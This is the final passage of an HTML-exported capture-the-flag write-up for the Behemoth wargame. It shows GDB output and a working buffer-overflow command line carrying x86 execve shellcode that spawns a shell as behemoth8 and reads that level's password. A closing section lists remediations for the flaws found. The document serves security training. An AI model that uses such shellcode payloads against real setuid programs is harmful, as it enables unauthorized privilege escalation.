&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2d</span><span class="c0">\x</span><span class="c8">70</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">61</span><span class="c0">\x</span><span class="c8">73</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">69</span><span class="c0">\x</span><span class="c8">6e</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e3</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>1</span><span class="c0">\x</span><span class="c8">53</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">cd</span><span class="c0">\x</span><span class="c8">80&#39;&quot;) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>The program being debugged has been started already. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Start it from the beginning? (y or n) y &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Starting program: /behemoth/behemoth7 $(python -c &quot;print &#39;A&#39;*528+&#39;</span><span class="c0">\x</span><span class="c8">60</span><span class="c0">\x</span><span class="c8">d3</span><span class="c0">\x</span><span class="c8">ff</span><span class="c0">\x</span><span class="c8">ff&#39;+&#39;A&#39;*112+&#39;</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">0b</span><span class="c0">\x</span><span class="c8">58</span><span class="c0">\x</span><span class="c8">99</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">66</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2d</span><span class="c0">\x</span><span class="c8">70</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">61</span><span class="c0">\x</span><span class="c8">73</span><span class="c0">\x</span><span class="c8">68<br></span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">69</span><span class="c0">\x</span><span class="c8">6e</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e3</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">51</span><span class="c0">\x</span><span class="c8">53</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">cd</span><span class="c0">\x</span><span class="c8">80&#39;&quot;) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>process 27236 is executing new program: /bin/bash &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>behemoth7@behemoth:/behemoth$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Program received signal SIGINT, Interrupt. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0x00007ffff76ed441 in __pselect (nfds=1, readfds=0x7fffffffdac0, writefds=0x0, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; &nbsp;exceptfds=0x0, timeout=&lt;optimized out&gt;, sigmask=0x7fffffffda40) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;at ../sysdeps/unix/sysv/linux/pselect.c:69 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>69 &nbsp; &nbsp; &nbsp;../sysdeps/unix/sysv/linux/pselect.c: No such file or directory. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c13">When trying this payload outside of GDB, a shell is successfully popped, and the final local user is compromised:</span></p><a id="t.a3cad10f3b68602c772a258e69a40b8a209b8568"></a><a id="t.68"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth7@behemoth:/behemoth /behemoth/behemoth7 $(python -c &quot;print &#39;A&#39;*528+&#39;</span><span class="c0">\x</span><span class="c8">60</span><span class="c0">\x</span><span class="c8">d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>3</span><span class="c0">\x</span><span class="c8">ff</span><span class="c0">\x</span><span class="c8">ff&#39;+&#39;A&#39;*112+&#39;</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">0b</span><span class="c0">\x</span><span class="c8">58</span><span class="c0">\x</span><span class="c8">99</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">66</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2d</span><span class="c0">\x</span><span class="c8">70</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">6 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>2</span><span class="c0">\x</span><span class="c8">61</span><span class="c0">\x</span><span class="c8">73</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">69</span><span class="c0">\x</span><span class="c8">6e</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e3</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">51</span><span class="c0">\x</span><span class="c8">53</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">cd</span><span class="c0">\x</span><span class="c8">80&#39;&quot;) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>bash-4.4$ whoami &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>behemoth8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>bash-4.4$ cat /etc/behemoth_pass/behemoth8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pheewij7Ae </span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><h1 class="c19" id="h.i7o2yd759joa"><span class="c41 c33">Conclusion</span></h1><hr><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>Every binary tested was successfully exploited. Many binaries which in practice should not be vulnerable, turned out to be exploitable due to the calling of sensitive system commands (in particular /bin/sh). This resulted in the horizontal privilege escalation in </span><span class="c34"><a class="c6" href="#h.y1go15cthbxu">Behemoth 0</a></span><span>&nbsp;and </span><span class="c34"><a class="c6" href="#h.1iiwc3vpzmaj">Behemoth 6</a></span><span class="c13">. </span></p><p class="c12"><span class="c13">There were multiple different vulnerabilities associated with each binary, running from format string exploits to buffer overflows and privilege escalation via the PATH environment variable.The following remediations should strongly be considered:</span></p><ul class="c18 lst-kix_vtzauvtbouvm-0 start"><li class="c12 c43 li-bullet-0"><span class="c13">Perform boundary checks on user input</span></li></ul><ul class="c18 lst-kix_vtzauvtbouvm-1 start"><li class="c12 c42 li-bullet-0"><span class="c13">Multiple binaries were vulnerable due to the lack of boundary checks</span></li><li class="c12 c42 li-bullet-0"><span class="c13">Shellcode injection was possible on many binaries due to this lack of validation</span></li><li class="c12 c42 li-bullet-0"><span>Bad shellcode filtering can be bypassed if EIP can be overwritten as can be seen in </span><span class="c34"><a class="c6" href="#h.tqwpdz749mlq">Behemoth 7</a></span></li></ul><ul class="c18 lst-kix_vtzauvtbouvm-0"><li class="c12 c43 li-bullet-0"><span class="c13">Filter user input</span></li></ul><ul class="c18 lst-kix_vtzauvtbouvm-1 start"><li class="c12 c42 li-bullet-0"><span class="c13">Malicious shellcode could easily be injected in multiple binaries due to the lack of user input validation (although shellcode could be encoded, this would nevertheless mitigate these kind of attacks)</span></li></ul><ul class="c18 lst-kix_vtzauvtbouvm-0"><li class="c12 c43 li-bullet-0"><span class="c13">Never run sensitive system commands unless absolutely necessary</span></li></ul><ul class="c18 lst-kix_vtzauvtbouvm-1 start"><li class="c12 c42 li-bullet-0"><span class="c13">System commands such as /bin/sh should rarely ever be called (especially within a SETUID binary) due to its insecurity</span></li><li class="c12 c42 li-bullet-0"><span class="c13">Binaries that should not have been vulnerable turned out to be exploitable due to calling /bin/sh</span></li></ul><ul class="c18 lst-kix_vtzauvtbouvm-0"><li class="c12 c43 li-bullet-0"><span class="c13">Always use the full path of a command</span></li></ul><ul class="c18 lst-kix_vtzauvtbouvm-1 start"><li class="c12 c42 li-bullet-0"><span>PATH environment variable attacks were present on </span><span class="c34"><a class="c6" href="#h.9e7hwp9wx39h">Behemoth 2</a></span></li></ul><ul class="c18 lst-kix_vtzauvtbouvm-0"><li class="c12 c43 li-bullet-0"><span class="c13">Never read files that can be created by an untrusted user</span></li></ul><ul class="c18 lst-kix_vtzauvtbouvm-1 start"><li class="c12 c42 li-bullet-0"><span>Symbolic links can be used to exploit this vulnerability as can be seen in </span><span class="c34"><a class="c6" href="#h.9e7hwp9wx39h">Behemoth 2</a></span><span>&nbsp;and </span><span class="c34"><a class="c6" href="#h.eoybw49l4xbw">Behemoth 4</a></span></li></ul><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><div><p class="c36 c45 c58"><span class="c13"></span></p></div><hr class="c81"><div><p class="c14 c36"><a href="#ftnt_ref1" id="ftnt1">[1]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=https://en.wikipedia.org/wiki/Debug_symbol&amp;sa=D&amp;source=editors&amp;ust=1653865765817948&amp;usg=AOvVaw10-Sbvx5uab4E9BRbP7EzI">https://en.wikipedia.org/wiki/Debug_symbol</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref2" id="ftnt2">[2]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-827.php&amp;sa=D&amp;source=editors&amp;ust=1653865765818443&amp;usg=AOvVaw2V79n8_mQbcRFN6UJyxSG6">http://shell-storm.org/shellcode/files/shellcode-827.php</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref3" id="ftnt3">[3]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=https://cs155.stanford.edu/papers/formatstring-1.2.pdf&amp;sa=D&amp;source=editors&amp;ust=1653865765818868&amp;usg=AOvVaw1B21ux-YEaTFgNKTQSEZ0e">https://cs155.stanford.edu/papers/formatstring-1.2.pdf</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref4" id="ftnt4">[4]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=https://en.wikipedia.org/wiki/Printf_format_string&amp;sa=D&amp;source=editors&amp;ust=1653865765819291&amp;usg=AOvVaw0ijy6fx6uwCLKlvsRn0pWq">https://en.wikipedia.org/wiki/Printf_format_string</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref5" id="ftnt5">[5]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-827.php&amp;sa=D&amp;source=editors&amp;ust=1653865765819708&amp;usg=AOvVaw2tFX798AvE8fmXDLd_HCbd">http://shell-storm.org/shellcode/files/shellcode-827.php</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref6" id="ftnt6">[6]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-606.php&amp;sa=D&amp;source=editors&amp;ust=1653865765820159&amp;usg=AOvVaw0C45KTrdPmD1bAlZ13xzSz">http://shell-storm.org/shellcode/files/shellcode-606.php</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref7" id="ftnt7">[7]</a><span class="c16">&nbsp; </span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=https://www.geeksforgeeks.org/udp-server-client-implementation-c/&amp;sa=D&amp;source=editors&amp;ust=1653865765820615&amp;usg=AOvVaw1qYOIKa6LgcMl68faUKxdZ">https://www.geeksforgeeks.org/udp-server-client-implementation-c/</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref8" id="ftnt8">[8]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=https://github.com/tmux/tmux&amp;sa=D&amp;source=editors&amp;ust=1653865765821020&amp;usg=AOvVaw2SkIhzeH4xVPVNIjsbUS3a">https://github.com/tmux/tmux</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref9" id="ftnt9">[9]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world&amp;sa=D&amp;source=editors&amp;ust=1653865765821457&amp;usg=AOvVaw2s4pCASzpVuDQOGeobC9VM">https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref10" id="ftnt10">[10]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=https://nets.ec/Ascii_shellcode&amp;sa=D&amp;source=editors&amp;ust=1653865765821871&amp;usg=AOvVaw0Hs4moeXutsZw5ljokRKI_">https://nets.ec/Ascii_shellcode</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref11" id="ftnt11">[11]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=https://www.tutorialspoint.com/cprogramming/c_command_line_arguments.htm&amp;sa=D&amp;source=editors&amp;ust=1653865765822316&amp;usg=AOvVaw0uaULKSyjHk8ZqJRg0dX8t">https://www.tutorialspoint.com/cprogramming/c_command_line_arguments.htm</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref12" id="ftnt12">[12]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=https://en.wikipedia.org/wiki/Alphanumeric_shellcode&amp;sa=D&amp;source=editors&amp;ust=1653865765822735&amp;usg=AOvVaw1-5xEQIasreKL2WrOrhZfg">https://en.wikipedia.org/wiki/Alphanumeric_shellcode</a></span><span class="c27 c16">&nbsp;</span></p></div><div><p class="c14 c36"><a href="#ftnt_ref13" id="ftnt13">[13]</a><span class="c16">&nbsp;</span><span class="c34 c16"><a class="c6" href="https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-606.php&amp;sa=D&amp;source=editors&amp;ust=1653865765823147&amp;usg=AOvVaw1bzymHynnNSiyEF0TQSN4h">http://shell-storm.org/shellcode/files/shellcode-606.php</a></span><span class="c27 c16">&nbsp;</span></p></div></body></html>